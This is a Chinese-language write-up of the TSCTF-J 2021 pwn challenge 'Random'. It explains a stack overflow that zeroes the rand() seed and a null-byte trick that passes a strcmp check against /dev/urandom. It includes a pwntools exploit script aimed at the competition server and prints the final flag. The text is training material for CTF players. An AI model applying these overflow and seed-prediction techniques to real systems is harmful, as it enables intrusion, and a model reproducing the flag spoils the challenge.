---
title: 「TSCTF-J_2021」Pwn - Random WriteUp
date: 2021-10-30
tags: ['TSCTF-J_2021', 'Pwn', 'writeup', 'wp']
authors: [nova]
---

## 分析

使用 IDA 打开, 发现题目要求我们输入正确10次C产生的随机数, 接着需要再输入正确的`/dev/urandom`产生的随机字节数据流

### 初期资料

#### rand()
`rand()`函数每次调用前都会查询是否调用过`srand(seed)`，是否给`seed`设定了一个值，如果有那么它会自动调用`srand(seed)`一次来初始化它的起始值
若之前没有调用`srand（seed）`，那么系统会自动给`seed`赋初始值，即`srand（1）`自动调用它一次

<!--truncate-->

#### /dev/urandom

`/dev/urandom`是Linux系统中提供的随机伪设备，任务是提供永不为空的随机字节数据流。



既然`rand()`是根据随机数种子`seed`生成随机数，那么只要`seed`相同，不就可以生成一样的随机数了么？



### 分析代码

#### 第一个随机

我们可以发现*buf*的长度是*22*, 却可以读入*0x30bytes*的数据

![read函数](https://cdn.ova.moe/img/image-20211025093806860.png)

观察栈堆，可以发现*buf*与*seed*只相距*0x18*个字节, 则我们可以考虑栈溢出覆盖随机数种子

![栈堆](https://cdn.ova.moe/img/image-20211025094037688.png)

#### 第二个随机

这里就略有难度了。搜索的时候我发现了一个通过填充`\x00`使`strlen=0`直接跳过`strncmp`的方法，但这个显然不适合我们的`strcmp`

![第二个随机](https://cdn.ova.moe/img/image-20211025095441204.png)

但`strcmp`工作原理是这样的：

> strcmp: 两个字符串自左向右逐个字符相比（按ASCII值大小相比较），直到出现不同的字符或遇'\0'为止。

也就是说, 如果*s*是以`\x00`开头的话, 我们的`strcmp`就会返回0, 而不用管后面的数据和`buff`是什么。

这也就是真正的random - 让`/dev/urandom`生成以`\x00`开头的字节数据流。

### 编写脚本

```python
from pwn import *
from ctypes import *
context.log_level = 'debug'
def burp():
    sh = remote("173.82.120.231", 10000) 
    # sh = process("./randomn") # 在本地测试的时候不知道为什么会报EOFError, 只好连接服务器跑脚本 （问了一哈可能是Ubuntu20.04LTS的程序保护问题）
    libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6') # 引用库文件
    payload = '\x00' * 0x20 # 既然我们的数据都只与buf和seed有关，不如直接全用\x00填充掉
    sh.sendlineafter("ranqom...",payload)
    libc.srand(1) # 用0和用1作为seed结果是一样的
    for i in range(10):
    	a = libc.rand()%100
    	sh.sendlineafter("is the number?\n", str(a))
    
    # Random_2
    payload = '\x00' # 随便填充一个啦
    sh.sendafter("THIS!??!!", payload)
    print(sh.recvline()) # 会有一个空行所以print了一下，其实也没有必要（）
    respon = str(sh.recvline())
    print(respon)
    if 'LUuUncky' in respon:
    	sh.interactive()
    else:
    	burp()
burp()
```

> 这里有一个小细节, 我们把`seed`用`\x00`填充后，`rand()`函数会自动调用`srand(1)`一次, 而其实`srand(1)`和`srand(0)`的结果是相同的
>
> 关于这里我在[stackoverflow](https://stackoverflow.com/questions/8049556/what-s-the-difference-between-srand1-and-srand0)上找到了一篇文章
>
> > How glibc does it:
> >
> > >  [around line 181 of glibc/stdlib/random_r.c](http://sourceware.org/git/?p=glibc.git;a=blob;f=stdlib/random_r.c;h=51a2e8c812aee78783bd6d38c1b6269d41c8e47e;hb=HEAD#l181), inside function `__srandom_r`
> >
> > ```csharp
> >   /* We must make sure the seed is not 0.  Take arbitrarily 1 in this case.  */
> >   if (seed == 0)
> >     seed = 1;
> > ```
> > But that's just how glibc does it. It depends on the implementation of the C standard library.

于是接下来就是漫长的爆破环节了，只能说运气是真的不好，爆破了一个多小时，让我一度以为脚本写的有问题（）

![后半段](https://cdn.ova.moe/img/image-20211025104934165.png)

经过漫长的等待终于拿到了FLAG`o00O0o00D_LuCk_With_y0ur_Ctf_career!!!}`，但只有后半段？怎么会事呢？

仔细研究IDA才发现，前半段其实在第一次random随机的时候就给出了（但是我由于觉得log等级debug的东西太多了在跑的时候给他注释掉了）

![前半段_IDA](https://cdn.ova.moe/img/image-20211025101006065.png)

于是再跑一次前半段，得到前半段flag`TSCTF-J{G0`

![前半段](https://cdn.ova.moe/img/image-20211025101032214.png)

拼接一下就有完整的FLAG了：

`TSCTF-J{G0o00O0o00D_LuCk_With_y0ur_Ctf_career!!!}`

